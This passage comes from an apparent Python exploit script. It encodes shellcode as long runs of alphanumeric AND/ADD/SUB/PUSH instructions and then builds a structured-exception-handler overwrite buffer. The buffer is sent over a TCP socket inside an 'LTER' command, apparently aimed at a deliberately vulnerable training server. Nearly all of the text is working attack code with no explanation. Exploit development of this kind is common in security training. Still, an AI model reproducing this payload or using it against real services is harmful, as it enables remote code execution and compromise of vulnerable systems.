shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x11\x76\x12" ## add  eax, 0x12761166
shellcode += "\x05\x55\x12\x65\x22" ## add  eax, 0x22651255
shellcode += "\x05\x64\x11\x56\x12" ## add  eax, 0x12561164
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x41\x77\x66" ## add  eax, 0x66774162
shellcode += "\x05\x51\x42\x66\x55" ## add  eax, 0x55664251
shellcode += "\x05\x32\x31\x55\x36" ## add  eax, 0x36553132
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x50\x14\x52" ## add  eax, 0x52145062
shellcode += "\x05\x51\x50\x14\x52" ## add  eax, 0x52145051
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x50\x66\x76" ## add  eax, 0x76665011
shellcode += "\x05\x01\x50\x65\x76" ## add  eax, 0x76655001
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x16\x10\x57" ## add  eax, 0x57101623
shellcode += "\x05\x24\x05\x10\x47" ## add  eax, 0x47100524
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x06\x52\x46\x75" ## add  eax, 0x75465206
shellcode += "\x05\x05\x52\x46\x75" ## add  eax, 0x75465205
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x22\x76\x21" ## add  eax, 0x21762273
shellcode += "\x05\x62\x22\x66\x10" ## add  eax, 0x10662262
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x21\x46\x73" ## add  eax, 0x73462113
shellcode += "\x05\x23\x22\x46\x62" ## add  eax, 0x62462223
shellcode += "\x05\x12\x21\x44\x52" ## add  eax, 0x52442112
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x76\x27\x63" ## add  eax, 0x63277663
shellcode += "\x05\x63\x66\x16\x62" ## add  eax, 0x62166663
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x35\x56\x15\x23" ## add  eax, 0x23155635
shellcode += "\x05\x35\x46\x05\x22" ## add  eax, 0x22054635
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x64\x12\x63" ## add  eax, 0x63126467
shellcode += "\x05\x66\x54\x22\x52" ## add  eax, 0x52225466
shellcode += "\x05\x45\x34\x12\x32" ## add  eax, 0x32123445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x36\x16\x72" ## add  eax, 0x72163654
shellcode += "\x05\x44\x36\x25\x62" ## add  eax, 0x62253644
shellcode += "\x05\x44\x34\x14\x52" ## add  eax, 0x52143444
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x24\x72\x33" ## add  eax, 0x33722461
shellcode += "\x05\x61\x14\x72\x34" ## add  eax, 0x34721461
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x26\x51\x36" ## add  eax, 0x36512671
shellcode += "\x05\x62\x15\x41\x25" ## add  eax, 0x25411562
shellcode += "\x05\x51\x23\x41\x23" ## add  eax, 0x23412351
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x26\x52\x74" ## add  eax, 0x74522661
shellcode += "\x05\x50\x26\x51\x64" ## add  eax, 0x64512650
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x63\x23\x75" ## add  eax, 0x75236367
shellcode += "\x05\x66\x62\x23\x74" ## add  eax, 0x74236266
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x25\x63\x74" ## add  eax, 0x74632547
shellcode += "\x05\x47\x15\x53\x74" ## add  eax, 0x74531547
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x12\x55\x77" ## add  eax, 0x77551216
shellcode += "\x05\x15\x12\x44\x66" ## add  eax, 0x66441215
shellcode += "\x05\x16\x12\x44\x55" ## add  eax, 0x55441216
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x76\x21\x41" ## add  eax, 0x41217664
shellcode += "\x05\x54\x65\x22\x31" ## add  eax, 0x31226554
shellcode += "\x05\x63\x54\x21\x31" ## add  eax, 0x31215463
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x61\x31\x42" ## add  eax, 0x42316165
shellcode += "\x05\x64\x50\x21\x41" ## add  eax, 0x41215064
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x44\x61\x24" ## add  eax, 0x24614467
shellcode += "\x05\x56\x44\x51\x14" ## add  eax, 0x14514456
shellcode += "\x05\x45\x34\x61\x24" ## add  eax, 0x24613445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x65\x71\x36" ## add  eax, 0x36716566
shellcode += "\x05\x55\x64\x62\x35" ## add  eax, 0x35626455
shellcode += "\x05\x36\x44\x51\x34" ## add  eax, 0x34514436
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax


buffer=lastadjust
buffer+=shellcode
buffer+="A"*(3433-len(buffer))
buffer+=longjump
buffer+=alpha2
buffer+="A"*(3515-len(buffer))
buffer+=nseh
buffer+=seh
buffer+=espadjust
buffer+=alpha1
buffer+="D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()

